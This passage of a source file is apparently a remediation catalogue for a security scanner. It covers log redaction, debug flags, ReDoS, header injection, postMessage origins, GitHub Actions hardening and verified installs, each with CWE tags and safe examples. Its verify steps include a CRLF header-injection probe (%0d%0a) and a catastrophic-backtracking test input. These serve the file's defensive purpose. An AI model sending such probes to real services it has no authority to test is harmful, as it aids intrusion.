    summary: 'Remove or mask secrets and personal data before logging.',
    why: 'Logs are copied to many systems and kept for a long time; credentials and card data in them become a second breach surface.',
    steps: [
      'Log identifiers, not secrets; mask values (keep the last 4 characters at most).',
      'Use a logger with redaction rules for known sensitive field names.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (pino)',
        `const logger = pino({ redact: ['req.headers.authorization', '*.password', '*.token'] });`,
      ),
    ],
    verify: 'Search recent logs for the field names and sample values.',
    references: [REF.owasp('Logging_Cheat_Sheet')],
  },
  'debug-enabled': {
    cwe: ['CWE-489', 'CWE-215'],
    owasp: ['A05'],
    effort: 'minutes',
    summary: 'Read debug flags from the environment and default them to off.',
    why: 'Debug mode can show stack traces and source, and some frameworks expose an interactive console that runs code.',
    steps: [
      'Read the flag from configuration and default it to false; never enable it in production settings.',
      'Restrict ALLOWED_HOSTS and management endpoints to what you need.',
    ],
    examples: [
      ex(
        'django',
        'python',
        'Django',
        `DEBUG = os.environ.get("DJANGO_DEBUG", "0") == "1"\nALLOWED_HOSTS = os.environ["ALLOWED_HOSTS"].split(",")`,
      ),
      ex('flask', 'python', 'Flask', `app.run(debug=os.environ.get("FLASK_DEBUG") == "1")`),
      ex(
        'spring',
        'properties',
        'Spring Boot',
        `management.endpoints.web.exposure.include=health,info`,
      ),
    ],
    verify: 'A deliberately triggered error shows a generic page in production.',
    references: [REF.owasp('Deployment_Cheat_Sheet')],
  },
  'bind-all-interfaces': {
    cwe: ['CWE-1327'],
    owasp: ['A05'],
    effort: 'minutes',
    summary:
      'Bind to 127.0.0.1 unless the service must accept outside connections; put a reverse proxy or firewall in front.',
    why: 'A service listening on every interface is reachable from any network the machine is attached to, including ones you did not intend.',
    steps: [
      'Use 127.0.0.1 for local-only services and rely on firewall rules/security groups for the rest.',
    ],
    examples: [ex('node', 'javascript', 'Node.js', `server.listen(3000, '127.0.0.1');`)],
    verify: 'ss -ltnp shows 127.0.0.1:<port> instead of 0.0.0.0:<port>.',
    references: [REF.owasp('Deployment_Cheat_Sheet')],
  },
  'file-permissions': {
    cwe: ['CWE-732'],
    owasp: ['A05'],
    effort: 'minutes',
    summary: 'Grant the minimum permissions (755 for directories, 644 for files, 600 for secrets).',
    why: 'Mode 777 lets any local user (or a compromised process) modify the file or directory.',
    steps: ['Choose the narrowest mode and an owner/group that actually need access.'],
    examples: [
      ex(
        'docker',
        'dockerfile',
        'Dockerfile',
        `RUN chown -R app:app /app && chmod -R u=rwX,g=rX,o= /app`,
      ),
    ],
    verify: 'ls -l shows no world-writable bits.',
    references: [REF.cwe(732)],
  },
  'empty-catch': {
    cwe: ['CWE-390'],
    owasp: ['A09'],
    effort: 'minutes',
    summary:
      'Handle the specific error or at least log it; if ignoring is intentional, say why in a comment.',
    why: 'Silently swallowed errors hide failed security checks and make incidents impossible to investigate.',
    steps: ['Catch the narrowest exception type and log it with context.'],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `try { await save(); } catch (err) { logger.error({ err }, 'save failed'); throw err; }`,
      ),
    ],
    verify: 'Trigger the failing path and check the log entry.',
    references: [REF.owasp('Error_Handling_Cheat_Sheet')],
  },
  'verbose-errors-code': {
    cwe: ['CWE-209'],
    owasp: ['A05'],
    effort: 'hours',
    summary:
      'Return a generic error plus a correlation id, and keep the stack trace in server logs.',
    why: 'Stack traces and database messages tell attackers about file paths, libraries and query shapes.',
    steps: ['Add a central error handler that logs details and returns a minimal body.'],
    examples: [
      ex(
        'express',
        'javascript',
        'Express',
        `app.use((err, _req, res, _next) => {\n  const id = crypto.randomUUID();\n  logger.error({ id, err });\n  res.status(500).json({ error: 'Internal error', id });\n});`,
      ),
    ],
    verify: 'Force an error and confirm the response body contains no trace.',
    references: [REF.owasp('Error_Handling_Cheat_Sheet')],
  },
  'regex-dos': {
    cwe: ['CWE-1333'],
    owasp: ['A04'],
    effort: 'hours',
    summary:
      'Rewrite the pattern without nested quantifiers, cap input length, or use a linear-time engine (RE2).',
    why: 'Patterns such as (a+)+ take exponential time on crafted input and can freeze a server with one request.',
    steps: [
      'Limit the length of input before matching.',
      'Rewrite ambiguous groups, or use RE2 bindings.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (re2)',
        `import RE2 from 're2';\nconst re = new RE2('^[a-z0-9._-]+@[a-z0-9.-]+$', 'i');\nif (input.length > 254 || !re.test(input)) throw new Error('invalid');`,
      ),
    ],
    verify:
      'Time the match against a 50,000-character hostile string; it must finish in milliseconds.',
    references: [REF.owasp('Denial_of_Service_Cheat_Sheet')],
  },
  'header-injection': {
    cwe: ['CWE-113'],
    owasp: ['A03'],
    effort: 'hours',
    summary:
      'Do not copy request values into response headers; if needed, allow-list or strip CR/LF.',
    why: 'Newline characters in a header value let an attacker add headers or split the response (cache poisoning, XSS).',
    steps: ['Validate against a fixed set of values or reject any value containing \\r or \\n.'],
    examples: [],
    verify: 'Send %0d%0a in the value; the response must not contain an injected header.',
    references: [REF.owasp('Injection_Prevention_Cheat_Sheet')],
  },
  'postmessage-origin': {
    cwe: ['CWE-346'],
    owasp: ['A01'],
    effort: 'minutes',
    summary:
      'Check event.origin against an allow-list in message handlers, and give postMessage an explicit target origin.',
    why: 'Any site can send a message to your window; without an origin check, its data is trusted as if it came from you.',
    steps: [
      'Compare event.origin to expected values before using event.data; never use "*" as the target origin for sensitive data.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Browser JS',
        `window.addEventListener('message', (e) => {\n  if (e.origin !== 'https://app.example.com') return;\n  handle(e.data);\n});\nframe.contentWindow.postMessage(data, 'https://app.example.com');`,
      ),
    ],
    verify: 'Send a message from a different origin; it must be ignored.',
    references: [REF.owasp('HTML5_Security_Cheat_Sheet')],
  },
  'target-blank': {
    cwe: ['CWE-1022'],
    owasp: ['A05'],
    effort: 'minutes',
    summary: 'Add rel="noopener noreferrer" to links that open in a new tab.',
    why: 'Older browsers let the opened page navigate your original tab (reverse tabnabbing).',
    steps: ['Add the rel attribute.'],
    examples: [
      ex(
        'generic',
        'html',
        'HTML',
        `<a href="https://partner.example" target="_blank" rel="noopener noreferrer">Partner</a>`,
      ),
    ],
    verify: 'Search templates for target="_blank" without rel.',
    references: [REF.mdn('Web/HTML/Attributes/rel/noopener')],
  },
  'secret-file-committed': {
    cwe: ['CWE-540', 'CWE-312'],
    owasp: ['A02', 'A05'],
    effort: 'hours',
    summary: 'Stop tracking the file, ignore it, and rotate every credential it contained.',
    why: 'Committed secret files remain in history and in every clone, even after deletion.',
    steps: [
      'git rm --cached <file> and add it to .gitignore.',
      'Rotate the credentials it held (assume exposure).',
      'Purge from history if it was pushed (git filter-repo), then force-push and tell collaborators to re-clone.',
      'Add a pre-commit secret scan (gitleaks).',
    ],
    examples: [
      ex(
        'generic',
        'bash',
        'Untrack and ignore',
        `git rm --cached .env\necho ".env" >> .gitignore\ngit commit -m "Stop tracking .env"`,
      ),
    ],
    verify: 'git ls-files | grep -E "\\.env$" prints nothing.',
    references: [REF.owasp('Secrets_Management_Cheat_Sheet')],
  },
  'github-actions-injection': {
    cwe: ['CWE-94', 'CWE-77'],
    owasp: ['A03', 'A08'],
    effort: 'minutes',
    summary:
      'Pass untrusted values through an environment variable instead of expanding them inside the script.',
    why: 'Issue titles, PR bodies and branch names are attacker-controlled; expanding them into a shell script lets an outsider run commands in your CI with its secrets.',
    steps: ['Assign the expression to env: and reference it as "$VAR" in the script.'],
    examples: [
      ex(
        'github-actions',
        'yaml',
        'Safe pattern',
        `- name: Use title safely\n  env:\n    TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$TITLE"`,
      ),
    ],
    verify: 'No ${{ github.event.* }} appears directly inside a run: block.',
    references: [
      'https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions',
    ],
  },
  'github-actions-pinning': {
    cwe: ['CWE-829'],
    owasp: ['A08'],
    effort: 'minutes',
    summary: 'Pin actions to a full commit SHA (or at least a release tag).',
    why: "A moving branch can change at any time, including through a compromise of the action's repository.",
    steps: ['Replace @main with the commit SHA of a reviewed release; let Dependabot update it.'],
    examples: [
      ex(
        'github-actions',
        'yaml',
        'Pinned action',
        `- uses: actions/checkout@<full-40-char-commit-sha>   # v4.x.y`,
      ),
    ],
    verify: 'grep -rE "uses:.*@(main|master|latest)" .github/workflows prints nothing.',
    references: [
      'https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions',
    ],
  },
  'github-actions-permissions': {
    cwe: ['CWE-250'],
    owasp: ['A01', 'A05'],
    effort: 'minutes',
    summary: 'Grant the workflow token only the permissions each job needs.',
    why: 'write-all lets any compromised step push code, create releases and modify settings.',
    steps: ['Set permissions: contents: read at the top, and add narrower write scopes per job.'],
    examples: [
      ex(
        'github-actions',
        'yaml',
        'Least privilege',
        `permissions:\n  contents: read\njobs:\n  release:\n    permissions:\n      contents: write`,
      ),
    ],
    verify: 'The workflow runs successfully with the reduced permissions.',
    references: [
      'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token',
    ],
  },
  'curl-pipe-shell': {
    cwe: ['CWE-494'],
    owasp: ['A08'],
    effort: 'hours',
    summary: 'Download to a file, verify a pinned checksum or signature, then run it.',
    why: 'Executing whatever a URL returns means a compromised or hijacked server can run code in your build or on your machine.',
    steps: [
      'Pin the version, download the file, check its SHA-256 against a value stored in your repository, then execute.',
      'Prefer the distribution or language package manager where possible.',
    ],
    examples: [
      ex(
        'generic',
        'bash',
        'Verified install',
        `curl -fsSLo install.sh https://example.com/install-1.2.3.sh\necho "<sha256>  install.sh" | sha256sum -c -\nsh install.sh`,
      ),
    ],
    verify: 'The build fails if the checksum does not match.',
    references: [REF.owasp('CI_CD_Security_Cheat_Sheet')],
  },
};
